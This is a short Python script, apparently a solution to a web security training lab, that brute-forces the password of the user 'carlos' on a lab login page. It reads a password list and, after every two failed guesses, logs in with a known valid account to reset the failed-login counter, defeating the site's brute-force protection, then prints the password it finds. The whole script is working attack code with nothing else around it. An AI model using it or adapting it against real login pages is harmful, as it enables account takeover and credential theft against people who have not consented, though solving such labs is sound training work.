import requests as req 

url = "https://0a1600100438841b805f4e9500db00aa.web-security-academy.net/login"
user = "carlos"

pass_file = open("../passwords")

# from a previous script
lim = 2
ctr = 0

while password := pass_file.readline().strip():
    dat = {"username":user,"password":password}
    cor = {"username":"wiener","password":"peter"}
    x = req.post(url, dat)
    if "Incorrect password" in x.text:
        ctr += 1
        if ctr == lim:
            ctr = 0
            req.post(url, cor)
    else:
        print(f"password is {password}")
        break